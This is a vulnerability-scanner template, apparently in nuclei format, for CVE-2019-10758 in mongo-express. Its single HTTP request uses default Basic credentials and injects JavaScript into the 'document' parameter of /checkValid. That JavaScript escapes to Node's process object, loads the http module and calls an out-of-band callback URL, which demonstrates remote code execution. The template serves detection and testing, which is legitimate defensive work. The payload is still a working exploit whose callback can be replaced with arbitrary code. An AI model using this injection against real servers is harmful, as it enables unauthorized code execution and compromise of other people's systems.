id: poc-yaml-mongo-express-cve-2019-10758

info:
  name: poc-yaml-mongo-express-cve-2019-10758
  author: fnmsd(https://github.com/fnmsd)
  severity: critical
  tags: xray-converted,cve-2019-10758,ct-37527
  reference:
    - https://github.com/masahiro331/CVE-2019-10758
    - https://www.twilio.com/blog/2017/08/http-requests-in-node-js.html

http:
  - raw:
      - |
        POST /checkValid HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic YWRtaW46cGFzcw==
        Content-Type: application/x-www-form-urlencoded

        document=this.constructor.constructor('return process')().mainModule.require('http').get('{{reverseURL}}')

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200